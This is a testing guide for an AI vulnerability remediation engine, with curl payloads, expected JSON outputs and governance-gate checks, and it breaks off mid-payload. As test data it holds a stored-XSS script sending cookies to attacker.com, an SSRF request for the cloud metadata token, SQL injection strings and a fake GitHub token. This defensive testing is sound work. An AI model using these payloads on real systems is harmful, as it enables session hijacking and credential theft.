# OneShield Vulnerability Engine: Testing & Verification Guide
## Comprehensive Test Payloads for SAST, DAST, SCA, Container, and Governance Gates

This document serves as the enterprise testing and verification manual for the **OneShield Autonomous Vulnerability Remediation Engine**. It provides ready-to-run payloads, verification procedures, expected outcomes, and debugging guidance across all supported security scanners:

1. **SAST** (Static Application Security Testing — SonarQube, Checkmarx, Semgrep, CodeQL)
2. **DAST** (Dynamic Application Security Testing — OWASP ZAP, Burp Suite, StackHawk)
3. **SCA** (Software Composition Analysis — Trivy SCA, Snyk, GitHub Dependabot, OSV)
4. **Container & Infrastructure Security** (Trivy Container, Aqua, Grype, CIS Benchmarks)
5. **Multi-Modal Enterprise Hybrid Audit** (Unified multi-scanner audit)
6. **Zero-Trust Security Gates & Fail-Safe Scenarios** (AST integrity, secret leak, circuit breaker, 4-Eyes quorum)

---

## 1. Architecture & Verification Coordinates

OneShield provides two interoperable runtime ingestion interfaces:

| Interface | Protocol | Target Endpoint | Primary Purpose |
| :--- | :--- | :--- | :--- |
| **Gateway Ingestion API** | HTTP POST | `/v1/scan-handler` | Ingests multi-tool findings (`scan_data`), enriches threat intel (EPSS/CISA KEV), and updates status store |
| **Status Polling API** | HTTP GET | `/v1/scan-status/{image_sha}` | Queries real-time audit ledger, reachability map, patch proposals, and Jira governance state |
| **Autonomous Agent API** | HTTP POST | `/v1/scan-handler` | Synchronous invocation of LangGraph multi-agent swarm (Judge A, Judge B, XGrammar, LoRA patches) |
| **Asynchronous Event Stream** | GCP Pub/Sub | Topic: `vulnerability-scan-queue`<br>Sub: `vulnerability-scan-worker-sub` | Streaming background ingestion with KEDA event-driven autoscaling (Scale-to-Zero) |

### Environment Quick Reference

* **Local Development**: `http://127.0.0.1:8080` or `http://127.0.0.1:8000`
* **GKE Internal Service**: `http://oneshield-app-service.ai-stack.svc.cluster.local:8080`
* **GKE Live Load Balancer / Ingress**: `http://34.8.57.243`
* **GCP Project**: `project-517889ec-8518-4856-a51` (`us-central1`)
* **GKE Cluster**: `oneshield-gke-cluster` (GKE Autopilot v1.35)
* **Cloud Shell / Local kubectl**: `kubectl exec -n ai-stack deployment/oneshield-app -- curl ...`

---

## 2. SAST (Static Application Security Testing)

SAST engines inspect application source code and AST representations prior to compilation. OneShield intercepts findings, calculates data-flow reachability to sensitive sinks (databases, shell, reflection), and generates syntactically validated patches.

---

### Test Case 1.1: Java / Spring Boot SQL Injection (CWE-89 / SonarQube JAVA-S2077)

* **Vulnerability Context**: Dynamic string concatenation inside an `EntityManager` query in a banking DAO.
* **Risk Tier**: `TIER_3_INTERNAL_DEV` (Auto-approvable upon AST verification).
* **Expected Outcome**: Reachability confirmed (`true`), parameterized query synthesized, Gate 1 & 2 passed, state hash generated.

#### Ingestion Gateway Payload (`scan_data` format)
```bash
curl -X POST "http://127.0.0.1:8080/v1/scan-handler" \
  -H "Content-Type: application/json" \
  -d '{
    "image_sha": "sha256:java_oracle_sast_run_101",
    "domain": "InvestmentBank",
    "scan_data": [
      {
        "tool": "SonarQube_SAST",
        "issue": {
          "ruleId": "JAVA-S2077",
          "packageName": "com.bank.dao.AccountRepository",
          "severity": "CRITICAL",
          "target_file_path": "src/main/java/com/bank/dao/AccountRepository.java",
          "description": "SQL Injection: Dynamic SQL concatenation in EntityManager.createQuery using unsanitized acct_id."
        }
      }
    ]
  }'
```

#### Synchronous Multi-Agent Swarm Payload
```bash
curl -X POST "http://127.0.0.1:8080/v1/scan-handler" \
  -H "Content-Type: application/json" \
  -d '{
    "vulnerability_id": "SAST-JAVA-SQLI-001",
    "code_snippet": "String query = \"SELECT a FROM Account a WHERE a.accountId = '\''\" + acct_id + \"'\''\";\nreturn em.createQuery(query, Account.class).getSingleResult();",
    "metadata": {
      "language": "java",
      "severity": "CRITICAL",
      "framework": "spring_boot_jpa"
    },
    "governance_tier": "TIER_3_INTERNAL_DEV",
    "quorum_signatures": []
  }'
```

#### Verification & Expected Output
```json
{
  "vulnerability_id": "SAST-JAVA-SQLI-001",
  "governance_tier": "TIER_3_INTERNAL_DEV",
  "judge_a_verdict": {
    "is_reachable": true,
    "severity_score": 9,
    "confidence": 0.95
  },
  "judge_b_verdict": {
    "is_reachable": true,
    "severity_score": 9,
    "confidence": 0.91
  },
  "circuit_breaker_tripped": false,
  "state_hash": "a8f3b2c...64-char-hex",
  "patch_eval_gate": {
    "gate_1_ast": true,
    "gate_2_secrets": true,
    "passed": true,
    "details": "Gate 1 (AST Syntax) and Gate 2 (Secret Scan) PASSED."
  },
  "escalated_to_human": false
}
```

---

### Test Case 1.2: Oracle PL/SQL Dynamic SQL Injection (CWE-89 / Checkmarx PLSQL-001)

* **Vulnerability Context**: Unescaped user parameter concatenated into `EXECUTE IMMEDIATE` in Oracle Core DB.
* **Risk Tier**: `TIER_1_CORE_FINANCIAL` (Requires 4-Eyes Dual-Key Quorum).
* **Expected Outcome**: Remediated with bind arguments (`:1 USING param`). Escalated to human if signatures are absent; auto-approved if dual signatures exist.

#### Synchronous Swarm Payload
```bash
curl -X POST "http://127.0.0.1:8080/v1/scan-handler" \
  -H "Content-Type: application/json" \
  -d '{
    "vulnerability_id": "SAST-ORACLE-PLSQL-002",
    "code_snippet": "EXECUTE IMMEDIATE '\''SELECT * FROM trade_accounts WHERE customer_id = '\'' || p_cust_id || '\'\'';",
    "metadata": {
      "language": "oracle_plsql",
      "severity": "CRITICAL",
      "db_engine": "oracle_19c"
    },
    "governance_tier": "TIER_1_CORE_FINANCIAL",
    "quorum_signatures": [
      {"role": "lead_developer", "name": "lead_dev@bank.com"},
      {"role": "security_officer", "name": "ciso_delegate@bank.com"}
    ]
  }'
```

#### Verification & Expected Output
* With dual signatures: `[Governance Gate] Tier 1 Core Financial: 4-Eyes Dual-Key Quorum SATISFIED. Releasing patch.` (`escalated_to_human: false`).
* Without signatures: `[Governance Gate] Tier 1 Core Financial: 4-Eyes Quorum INCOMPLETE. Escalating for sign-off.` (`escalated_to_human: true`).

---

### Test Case 1.3: Frontend React DOM-based Cross-Site Scripting (CWE-79 / ESLint react/no-danger)

* **Vulnerability Context**: Raw HTML injection into React Virtual DOM using unvalidated API input.
* **Expected Outcome**: Reachability confirmed; patch suggests DOMPurify sanitization.

#### Ingestion Gateway Payload
```bash
curl -X POST "http://127.0.0.1:8080/v1/scan-handler" \
  -H "Content-Type: application/json" \
  -d '{
    "image_sha": "sha256:react_frontend_sast_201",
    "domain": "CorporateBank",
    "scan_data": [
      {
        "tool": "Semgrep_SAST",
        "issue": {
          "ruleId": "react.security.audit.react-dangerouslysetinnerhtml",
          "packageName": "frontend-user-portal",
          "severity": "HIGH",
          "target_file_path": "src/components/UserProfile.jsx",
          "description": "Unescaped user-controlled markdown passed directly to dangerouslySetInnerHTML."
        }
      }
    ]
  }'
```

---

## 3. DAST (Dynamic Application Security Testing)

DAST scanners (e.g., OWASP ZAP, Burp Suite) evaluate live HTTP request/response payloads against running application endpoints. OneShield correlates active endpoint findings against backend routes.

---

### Test Case 2.1: REST API Blind SQL Injection (CWE-89 / OWASP ZAP 40018)

* **Endpoint**: `/api/v1/client/profile-hydrator?accountId=1001' OR '1'='1`
* **Vulnerability Context**: HTTP parameter manipulation causes delayed or unconditional response.
* **Expected Outcome**: DAST finding triaged, correlated with backend data layer, reachability confirmed, remediation patch generated.

#### Ingestion Gateway Payload
```bash
curl -X POST "http://127.0.0.1:8080/v1/scan-handler" \
  -H "Content-Type: application/json" \
  -d '{
    "image_sha": "sha256:edge_gateway_dast_run_301",
    "domain": "CorporateBank",
    "scan_data": [
      {
        "tool": "OWASP_ZAP_DAST",
        "alert": {
          "ruleId": "OWASP-2021-A03:CWE-89",
          "packageName": "/api/v1/client/profile-hydrator",
          "severity": "HIGH",
          "target_file_path": "src/controllers/ProfileController.java",
          "description": "SQL Injection confirmed via time-based blind injection on URL query parameter acct_id."
        }
      }
    ]
  }'
```

---

### Test Case 2.2: Cross-Site Scripting via Stored Search Query (CWE-79 / ZAP-90033)

* **Endpoint**: `https://portal.bank.com/api/v1/user/preferences`
* **Payload Injected**: `<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>`
* **Expected Outcome**: Finding triaged under DAST sink; security review generates output encoding filter patch.

#### Ingestion Gateway Payload
```bash
curl -X POST "http://127.0.0.1:8080/v1/scan-handler" \
  -H "Content-Type: application/json" \
  -d '{
    "image_sha": "sha256:portal_dast_run_302",
    "domain": "CorporateBank",
    "scan_data": [
      {
        "tool": "dast-owasp-zap",
        "issue": {
          "ruleId": "ZAP-90033",
          "packageName": "https://portal.bank.com/api/v1/user/preferences",
          "severity": "HIGH",
          "target_file_path": "src/middleware/ContentSecurityFilter.java",
          "description": "Reflected XSS: User preference string echoed without contextual HTML entity encoding."
        }
      }
    ]
  }'
```

---

### Test Case 2.3: Server-Side Request Forgery (SSRF - CWE-918 / Burp Suite)

* **Endpoint**: `/api/v1/webhook-dispatcher`
* **Attack Payload**: `targetUrl=http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`
* **Expected Outcome**: Flagged as CRITICAL SSRF; patch introduces metadata IP (`169.254.169.254`) and private RFC 1918 egress blocking.

#### Ingestion Gateway Payload
```bash
curl -X POST "http://127.0.0.1:8080/v1/scan-handler" \
  -H "Content-Type: application/json" \
  -d '{
    "image_sha": "sha256:webhook_service_dast_303",
    "domain": "CorporateBank",
    "scan_data": [
      {
        "tool": "Burp_Suite_DAST",
        "issue": {
          "ruleId": "CWE-918",
          "packageName": "/api/v1/webhook-dispatcher",
          "severity": "CRITICAL",
          "target_file_path": "src/services/WebhookDispatcher.java",
          "description": "SSRF: Target URL parameter permits egress requests to internal cloud metadata IP 169.254.169.254."
        }
      }
    ]
  }'
```

---

## 4. SCA (Software Composition Analysis)

SCA scanners inspect third-party dependencies in `pom.xml`, `package.json`, or `requirements.txt`. OneShield cross-references findings with live EPSS (Exploit Prediction Scoring System) and CISA KEV (Known Exploited Vulnerabilities) to eliminate false alarms for non-reachable libraries.

---

### Test Case 3.1: Critical Protocol CVE - HTTP/2 Rapid Reset (CVE-2023-44487)

* **Impacted Library**: `io.netty:netty-handler:4.1.99.Final` (Fixed in: `4.1.100.Final`).
* **Threat Intel Metrics**: EPSS Score: `0.89` (Very High), CISA KEV: `True`.
* **Expected Outcome**: Evaluated as HIGH REACHABILITY due to active exploitation. Immediate dependency version upgrade patch generated.

#### Ingestion Gateway Payload
```bash
curl -X POST "http://127.0.0.1:8080/v1/scan-handler" \
  -H "Content-Type: application/json" \
  -d '{
    "image_sha": "sha256:sca_netty_audit_401",
    "domain": "CoreBankingSystem",
    "scan_data": [
      {
        "tool": "trivy-sca",
        "issue": {
          "ruleId": "CVE-2023-44487",
          "packageName": "io.netty:netty-handler",
          "currentVersion": "4.1.99.Final",
          "fixedVersion": "4.1.100.Final",
          "severity": "HIGH",
          "target_file_path": "pom.xml",
          "description": "HTTP/2 Rapid Reset DDoS attack enables request cancellation flood."
        }
      }
    ]
  }'
```

---

### Test Case 3.2: Remote Code Execution - Apache Log4Shell (CVE-2021-44228)

* **Impacted Library**: `org.apache.logging.log4j:log4j-core:2.14.1` (Fixed in: `2.17.1`).
* **Threat Intel Metrics**: EPSS Score: `0.97`, CISA KEV: `True`.
* **Expected Outcome**: Highest priority triage, automated patch generated for `pom.xml`.

#### Ingestion Gateway Payload
```bash
curl -X POST "http://127.0.0.1:8080/v1/scan-handler" \
  -H "Content-Type: application/json" \
  -d '{
    "image_sha": "sha256:sca_log4j_audit_402",
    "domain": "CoreBankingSystem",
    "scan_data": [
      {
        "tool": "Trivy_SCA",
        "issue": {
          "ruleId": "CVE-2021-44228",
          "packageName": "org.apache.logging.log4j:log4j-core",
          "currentVersion": "2.14.1",
          "fixedVersion": "2.17.1",
          "severity": "CRITICAL",
          "target_file_path": "pom.xml",
          "description": "JNDI lookup features do not protect against attacker controlled LDAP endpoints."
        }
      }
    ]
  }'
```

---

### Test Case 3.3: Test-Scoped Dependency False Positive Elimination

* **Impacted Library**: `junit:junit:4.13.1` (CVE-2020-15250, TemporaryFolder insecure permissions).
* **Scope**: Test execution sandbox only (not shipped to production runtime).
* **Expected Outcome**: Reachability agent evaluates `is_reachable: false`. Action log records `LOW RISK VERDICT / ALLOW_SIGN` without blocking production CI/CD.

#### Ingestion Gateway Payload
```bash
curl -X POST "http://127.0.0.1:8080/v1/scan-handler" \
  -H "Content-Type: application/json" \
  -d '{
    "image_sha": "sha256:junit_test_audit_403",
    "domain": "CorporateBank",
    "scan_data": [
      {
        "tool": "trivy-sca",
        "issue": {
          "ruleId": "CVE-2020-15250",
          "packageName": "junit:junit",
          "currentVersion": "4.13.1",
          "severity": "MEDIUM",
          "target_file_path": "pom.xml",
          "description": "Insecure temporary folder creation in test runners."
        }
      }
    ]
  }'
```

---

## 5. Container & Infrastructure Security

Container scanners inspect OS packages (`dpkg`, `apk`, `rpm`), kernel boundaries, base images, and runtime pod specifications.

---

### Test Case 4.1: Critical Edge Controller Vulnerability (CVE-2026-3001)

* **Target Artifact**: `us-central1-docker.pkg.dev/.../nginx-ingress-controller:1.9.0`
* **Vulnerability**: Remote Code Execution in edge routing load balancer.
* **Expected Outcome**: Immediate alert, Dockerfile/Helm base image pinned to fixed version `1.9.4`.

#### Ingestion Gateway Payload
```bash
curl -X POST "http://127.0.0.1:8080/v1/scan-handler" \
  -H "Content-Type: application/json" \
  -d '{
    "image_sha": "sha256:edge_ingress_container_501",
    "domain": "CorporateBank",
    "scan_data": [
      {
        "tool": "Trivy_Edge_Scanner",
        "vulnerability": {
          "cveId": "CVE-2026-3001",
          "packageName": "nginx-ingress-controller",
          "currentVersion": "1.9.0",
          "fixedVersion": "1.9.4",
          "severity": "CRITICAL",
          "target_file_path": "deployments/ingress-controller.yaml",
          "description": "Remote Code Execution vulnerability in edge load balancing routing modules."
        }
      }
    ]
  }'
```

---

### Test Case 4.2: Container Privilege Escalation & CIS Benchmark 5.2 Violation

* **Target Manifest**: `k8s/app/backend-deployment.yaml`
* **Finding**: Container runs with `allowPrivilegeEscalation: true` or missing `runAsNonRoot: true`.
* **Expected Outcome**: Kyverno admission controller or OneShield engine enforces non-root execution and read-only root filesystems.

#### Synchronous Multi-Agent Payload
```bash
curl -X POST "http://127.0.0.1:8080/v1/scan-handler" \
  -H "Content-Type: application/json" \
  -d '{
    "vulnerability_id": "CIS-K8S-5.2.1-CONTAINER-ROOT",
    "code_snippet": "securityContext:\n  allowPrivilegeEscalation: true\n  runAsUser: 0\n  capabilities:\n    add: [\"SYS_ADMIN\"]",
    "metadata": {
      "language": "yaml",
      "severity": "HIGH",
      "benchmark": "CIS_Kubernetes_Benchmark_v1.7"
    },
    "governance_tier": "TIER_3_INTERNAL_DEV",
    "quorum_signatures": []
  }'
```

---

## 6. Multi-Modal Enterprise Hybrid Audit Payload

This payload combines SAST, DAST, SCA, and Container findings in a single comprehensive transaction, simulating a complete CI/CD release gate scan.

```bash
curl -X POST "http://127.0.0.1:8080/v1/scan-handler" \
  -H "Content-Type: application/json" \
  -d '{
    "image_sha": "sha256:full_enterprise_audit_601",
    "domain": "CoreBankingSystem",
    "repo_owner": "jagat1980",
    "repo_name": "vulnerability-management",
    "base_branch": "main",
    "scan_data": [
      {
        "tool": "sast-sonar",
        "issue": {
          "ruleId": "JAVA-S2077",
          "packageName": "com.bank.dao.AccountRepository",
          "severity": "CRITICAL",
          "target_file_path": "src/main/java/com/bank/dao/AccountRepository.java",
          "description": "SQL Injection via dynamic string concatenation in Oracle DB layer."
        }
      },
      {
        "tool": "trivy-sca",
        "issue": {
          "ruleId": "CVE-2023-44487",
          "packageName": "io.netty:netty-handler",
          "currentVersion": "4.1.99.Final",
          "fixedVersion": "4.1.100.Final",
          "severity": "HIGH",
          "target_file_path": "pom.xml",
          "description": "HTTP/2 Rapid Reset Denial of Service."
        }
      },
      {
        "tool": "dast-owasp-zap",
        "issue": {
          "ruleId": "ZAP-90033",
          "packageName": "https://portal.bank.com/api/v1/user/search",
          "severity": "HIGH",
          "target_file_path": "src/controllers/SearchController.java",
          "description": "Cross-Site Scripting verified on search query parameter."
        }
      },
      {
        "tool": "Trivy_Container",
        "vulnerability": {
          "cveId": "CVE-2023-6246",
          "packageName": "glibc",
          "currentVersion": "2.31-13+deb11u7",
          "fixedVersion": "2.31-13+deb11u8",
          "severity": "CRITICAL",
          "target_file_path": "Dockerfile",
          "description": "Heap buffer overflow in glibc syslog function."
        }
      }
    ]
  }'
```

#### Querying Multi-Modal Audit Status
```bash
curl -s "http://127.0.0.1:8080/v1/scan-status/sha256:full_enterprise_audit_601" | jq .
```

#### Expected Execution Ledger Output
```json
{
  "status": "COMPLETED",
  "image_sha": "sha256:full_enterprise_audit_601",
  "domain": "CoreBankingSystem",
  "resolution_strategy": "AUTO_PATCH",
  "triaged_findings_count": 4,
  "reachability_map": {
    "JAVA-S2077": true,
    "CVE-2023-44487": true,
    "ZAP-90033": true,
    "CVE-2023-6246": true
  },
  "proposed_patches_count": 4,
  "governance_gate": {
    "status": "APPROVED",
    "approver_identity": "AST-Verified-Engine"
  }
}
```

---

## 7. Zero-Trust Security Gates & Fail-Safe Verification

OneShield implements strict runtime guardrails ensuring AI-generated remediations never introduce new vulnerabilities or bypass governance rules.

---

### Test Case 6.1: Gate 1 AST Delimiter Integrity Failure (Malformed SQL Quote)

* **Test Scenario**: LLM generates a patch with an unescaped single quote or mismatched bracket.
* **Verification Gate**: Gate 1 Lexical Delimiter Integrity Scan.
* **Expected Result**: Gate 1 fails; patch is **rejected**; escalated to DBA.

```bash
curl -X POST "http://127.0.0.1:8080/v1/scan-handler" \
  -H "Content-Type: application/json" \
  -d '{
    "vulnerability_id": "SYNTAX-ERR-DELIMITER-FAIL",
    "code_snippet": "SELECT * FROM users WHERE id = '\'' || id;",
    "metadata": {"language": "oracle_plsql", "severity": "HIGH"},
    "governance_tier": "TIER_3_INTERNAL_DEV",
    "remediation_patch": "EXECUTE IMMEDIATE '\''SELECT * FROM users WHERE id = :1'\'' USING id; '\''",
    "quorum_signatures": []
  }'
```

#### Expected Response Log
```
[Evaluation Flywheel] Patch Gate Verification: Gate 1 FAILED: Unbalanced single quote detected in SQL/code snippet.
[Governance Gate] Patch verification FAILED. Escalating to DBA.
```

---

### Test Case 6.2: Gate 2 Secret & Credential Leak Prevention

* **Test Scenario**: Remediation code inadvertently leaks an API token, private key, or password.
* **Verification Gate**: Gate 2 Secret Scan Regex Engine.
* **Expected Result**: Gate 2 fails; secret injection blocked; alert raised.

```bash
curl -X POST "http://127.0.0.1:8080/v1/scan-handler" \
  -H "Content-Type: application/json" \
  -d '{
    "vulnerability_id": "SECRET-LEAK-PREVENTION-FAIL",
    "code_snippet": "apiKey = request.getHeader(\"X-Key\");",
    "metadata": {"language": "java", "severity": "CRITICAL"},
    "governance_tier": "TIER_3_INTERNAL_DEV",
    "remediation_patch": "String apikey = \"ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890\";\nauthenticate(apikey);",
    "quorum_signatures": []
  }'
```

#### Expected Response Log
```
[Evaluation Flywheel] Patch Gate Verification: Gate 2 FAILED: Hardcoded secret or credential token detected in patch.
[Governance Gate] Patch verification FAILED. Escalating to DBA.
```

---

### Test Case 6.3: Layer 2 Confidence Circuit Breaker Trip

* **Test Scenario**: LLM self-reported confidence drops below `0.70` due to ambiguity.
* **Verification Gate**: Confidence Circuit Breaker Threshold.
* **Expected Result**: Circuit breaker trips; skips automatic patch synthesis; routes directly to human escalation.

```bash
curl -X POST "http://127.0.0.1:8080/v1/scan-handler" \
  -H "Content-Type: application/json" \
  -d '{
    "vulnerability_id": "LOW-CONF-CIRCUIT-BREAKER",
    "code_snippet": "eval(untrusted_payload);",
    "metadata": {"language": "python", "severity": "HIGH"},
    "governance_tier": "TIER_3_INTERNAL_DEV",
    "judge_a_verdict": {
      "is_reachable": true,
      "severity_score": 7,
      "confidence": 0.45,
      "reasoning": "Ambiguous call stack context."
    },
    "quorum_signatures": []
  }'
```

#### Expected Response
```json
{
  "vulnerability_id": "LOW-CONF-CIRCUIT-BREAKER",
  "circuit_breaker_tripped": true,
  "escalated_to_human": true,
  "escalation_reason": "Judge A Confidence Circuit Breaker (0.45 < 0.70)"
}
```

---

### Test Case 6.4: Risk-Based 4-Eyes Dual-Key Quorum (Tier 1 vs Tier 3)

| Governance Tier | Quorum Requirement | Condition | Swarm Behavior |
| :--- | :--- | :--- | :--- |
| **Tier 3 (Internal Dev)** | None | AST Gate Passed | **Auto-Approved**: Tagged `[AST-Verified]` and PR emitted automatically |
| **Tier 1 (Core Financial)** | Missing 4-Eyes | Single or No Signer | **Escalated**: Blocked until both `lead_developer` and `security_officer` sign |
| **Tier 1 (Core Financial)** | Complete 4-Eyes | Both Signers Present | **Approved**: Cryptographically signed release |

---

## 7. Jev (TypeSafe AI System 1) Pre-Router, Parallel Consensus & Gate 3 Verification

Jev provides sub-millisecond in-process deterministic pre-routing, parallel consensus calibration, and post-patch Gate 3 regression scoring.

### 7.1 Fast-Discard Verification (0 GPU Cost, < 2ms Latency)
Tests that a benign, parameterized query is terminated immediately at `END`, completely bypassing SGLang GPU inference.

#### cURL Payload
```bash
curl -X POST http://localhost:8080/v1/scan-handler \
  -H "Content-Type: application/json" \
  -d '{
    "vulnerability_id": "BENIGN-AST-001",
    "code_snippet": "EXECUTE IMMEDIATE '\''SELECT * FROM accounts WHERE id = :1'\'' USING acct_id;",
    "metadata": {
      "language": "oracle_plsql",
      "severity": "LOW"
    },
    "governance_tier": "TIER_3_INTERNAL_DEV"
  }'
```

#### Expected Response
```json
{
  "vulnerability_id": "BENIGN-AST-001",
  "governance_tier": "TIER_3_INTERNAL_DEV",
  "jev_pre_route": {
    "decision": "FAST_DISCARD",
    "confidence": 0.97,
    "is_cisa_kev": false,
    "system1_latency_ms": 0.05,
    "reasoning": "Deterministic AST match: Safe parameterized query or static assignment verified without user concatenation. Safely discarding at $0 GPU cost."
  },
  "gpu_bypassed": true,
  "remediation_patch": null,
  "circuit_breaker_tripped": false,
  "escalated_to_human": false
}
```

---

### 7.2 CISA KEV Mandate Emergency Fast-Path
Tests that an active exploit cataloged in CISA KEV or high EPSS (`>= 0.85`) activates the Dual-Track Fast-Path, bypassing multi-judge reasoning delay directly into SGLang patch synthesis.

#### cURL Payload
```bash
curl -X POST http://localhost:8080/v1/scan-handler \
  -H "Content-Type: application/json" \
  -d '{
    "vulnerability_id": "CVE-2023-34362",
    "code_snippet": "EXECUTE IMMEDIATE '\''SELECT * FROM transfers WHERE id = '\'' || user_input || '\'\'';",
    "metadata": {
      "language": "oracle_plsql",
      "severity": "CRITICAL",
      "cisa_kev": true
    },
    "governance_tier": "TIER_3_INTERNAL_DEV"
  }'
```

#### Expected Log Output
```
[Jev Pre-Router] Evaluating finding CVE-2023-34362 in-process (<2ms)...
[Jev Pre-Router] [MANDATE-TRIGGER] CVE-2023-34362 active in CISA KEV! Routing directly to SGLang Patch Synthesizer (Fast-Path).
[Jev Router] CISA KEV active exploit detected! Bypassing judges directly to Patch Synthesizer.
[Patch Generator - Qwen/Qwen2.5-Coder-7B-Instruct + LoRA:oracle-sql] Generating remediation patch...
[Evaluation Flywheel] Patch Gate Verification: Gate 1 (AST Syntax), Gate 2 (Secret Scan), and Gate 3 (Jev Safety Score: 0.96) PASSED.
[Governance Gate] Tier 3 Internal Dev finding: Auto-approved with [AST-Verified + Jev-Certified] badge. Emitting PR.
```

---

### 7.3 Gate 3 Patch Verification & 1-Shot Self-Correction Loop
Tests that if SGLang generates a patch that fails Gate 3 (retains string concatenation or misses parameter bindings), Jev feeds structured critique back to SGLang for an automated 1-shot self-correction before human escalation.

#### Automated Execution
```powershell
python -m pytest tests/test_jev_lifecycle.py -k "test_jev_1shot_self_correction_loop" -v
```

---

## 8. Asynchronous GCP Pub/Sub Stream Verification

To verify the event-driven worker running in GKE Autopilot under KEDA autoscaling:

### Publish Alert to Pub/Sub Topic
```bash
gcloud pubsub topics publish vulnerability-scan-queue \
  --project=project-517889ec-8518-4856-a51 \
  --message='{
    "vulnerability_id": "PUBSUB-CVE-2026-LIVE",
    "code_snippet": "EXECUTE IMMEDIATE '\''SELECT * FROM audit_log WHERE event_id = '\'' || event_id || '\'\'';",
    "metadata": {
      "language": "oracle_plsql",
      "severity": "CRITICAL"
    },
    "governance_tier": "TIER_3_INTERNAL_DEV",
    "quorum_signatures": []
  }'
```

### Stream Application Logs in GKE
```bash
kubectl logs deployment/oneshield-app -n ai-stack -f --tail=30
```

### Expected Log Output
```
[INFO] oneshield-gateway: 📨 Ingested scan alert from Pub/Sub: PUBSUB-CVE-2026-LIVE
[Jev Pre-Router] Evaluating finding PUBSUB-CVE-2026-LIVE in-process (<2ms)...
[Judge A - Qwen/Qwen2.5-Coder-7B-Instruct + LoRA:judge-reachability] Analyzing vulnerability PUBSUB-CVE-2026-LIVE...
[Judge B - Qwen/Qwen2.5-Coder-7B-Instruct + LoRA:judge-governance] Cross-examining vulnerability PUBSUB-CVE-2026-LIVE (Radix KV reused)...
[Router] Both judges confirmed Reachability. Routing to SGLang Patch Synthesizer...
[Patch Generator - Qwen/Qwen2.5-Coder-7B-Instruct + LoRA:oracle-sql] Generating remediation patch...
[Evaluation Flywheel] Patch Gate Verification: Gate 1 (AST Syntax), Gate 2 (Secret Scan), and Gate 3 (Jev Safety Score: 0.96) PASSED.
[Governance Gate] Tier 3 Internal Dev finding: Auto-approved with [AST-Verified + Jev-Certified] badge. Emitting PR.
[INFO] oneshield-gateway: ✅ Completed triage for PUBSUB-CVE-2026-LIVE (Escalated: False)
```

---

## 9. Verification Checklist & Success Matrix

| Test Case | Scanner Engine | Finding / Rule | Primary Gate / Guardrail | Expected Result |
| :--- | :--- | :--- | :--- | :--- |
| **7.1** | System 1 Pre-Router | Parameterized Query | Jev Fast-Discard | Resolved in < 2ms; GPU bypassed (0 tokens) |
| **7.2** | Threat Mandate | `CVE-2023-34362` (MOVEit) | CISA KEV Catalog | Dual-Track Fast-Path directly to SGLang Patch |
| **7.3** | Judging Panel | Static / Safe Constant | Jev Parallel Consensus | LLM hallucination detected; circuit breaker tripped |
| **7.4** | Patch Gate 3 | Unsafe Concatenation | Jev Patch Safety Score | Gate 3 rejects (< 0.75); triggers 1-shot self-correction |

| **1.1** | SAST | `JAVA-S2077` (SQLi) | AST Validation | Auto-approved patch |
| **1.2** | SAST | `PLSQL-001` (Oracle) | 4-Eyes Dual-Key Quorum | Escalated without dual signers; approved with dual signers |
| **1.3** | SAST | `react/no-danger` (XSS) | Output Sanitization | Auto-approved patch with DOMPurify |
| **2.1** | DAST | `OWASP-2021-A03:CWE-89` | Endpoint Correlation | High reachability confirmed; SQL patch generated |
| **2.2** | DAST | `ZAP-90033` (XSS) | Contextual Encoding | XSS filter patch generated |
| **2.3** | DAST | `CWE-918` (SSRF) | Private IP Egress Filter | Egress IP filter block generated |
| **3.1** | SCA | `CVE-2023-44487` (HTTP/2) | EPSS & CISA KEV Feed | High exploitation confirmed; pom.xml bumped |
| **3.2** | SCA | `CVE-2021-44228` (Log4j) | EPSS Score (0.97) | Critical dependency patch |
| **3.3** | SCA | `CVE-2020-15250` (JUnit) | Reachability Analysis | False positive pruned (`is_reachable: false`) |
| **4.1** | Container | `CVE-2026-3001` (Ingress) | Image Pinning | Base image version bump |
| **4.2** | Container | CIS Benchmark 5.2 | Kyverno / SecurityContext | Non-root `runAsUser: 10001` enforced |
| **5.0** | Hybrid | Multi-Tool Unified | Parallel Agent Swarm | 4 findings triaged in single transaction |
| **6.1** | Guardrail | Malformed Quote | Gate 1 (AST Integrity) | Patch rejected; routed to human DBA |
| **6.2** | Guardrail | Secret Token Leak | Gate 2 (Secret Scan) | Leak blocked; alert emitted |
| **6.3** | Guardrail | Low Confidence (< 0.70) | Circuit Breaker | Execution halted; routed to Jira |
| **8.0** | Streaming | Pub/Sub Event | KEDA Autoscaler | Dynamic scale-up and scale-to-zero |

---

## 10. Live Ingress Public IP Testing (`34.8.57.243`)

The OneShield API Gateway is exposed publicly through Google Cloud External Application Load Balancer at **`http://34.8.57.243`**.

### 10.1 Live Ingress Health Check
Verify gateway availability and authentication readiness:
```powershell
# PowerShell
curl.exe -i http://34.8.57.243/health
```
```bash
# Linux / macOS / Bash
curl -i http://34.8.57.243/health
```
**Expected Response:**
```http
HTTP/1.1 200 OK
content-type: application/json
date: Mon, 28 Sep 2026 12:01:24 GMT
server: uvicorn
Via: 1.1 google

{"status":"ok","version":"1.0.0","service":"oneshield-vulnerability-engine","auth_enabled":false}
```

### 10.2 Dispatch Alert Payload via Ingress (`POST /v1/scan-handler`)
Send an Oracle PL/SQL dynamic concatenation alert directly through the public ingress:
```powershell
# PowerShell
$body = @{
    image_sha = "sha256:oracle_billing_core_run_2026"
    domain = "CoreBanking"
    scan_data = @(
        @{
            tool = "SonarQube_SAST"
            issue = @{
                ruleId = "PLSQL-SQLI-001"
                packageName = "com.bank.db.TradeSettlement"
                severity = "CRITICAL"
                target_file_path = "src/sql/settlement.sql"
                description = "SQL Injection: Dynamic concatenation in EXECUTE IMMEDIATE without bind variables."
            }
        }
    )
} | ConvertTo-Json -Depth 5

Invoke-RestMethod -Uri "http://34.8.57.243/v1/scan-handler" -Method Post -ContentType "application/json" -Body $body
```
```bash
# Bash
curl -X POST "http://34.8.57.243/v1/scan-handler" \
  -H "Content-Type: application/json" \
  -d '{
    "image_sha": "sha256:oracle_billing_core_run_2026",
    "domain": "CoreBanking",
    "scan_data": [
      {
        "tool": "SonarQube_SAST",
        "issue": {
          "ruleId": "PLSQL-SQLI-001",
          "packageName": "com.bank.db.TradeSettlement",
          "severity": "CRITICAL",
          "target_file_path": "src/sql/settlement.sql",
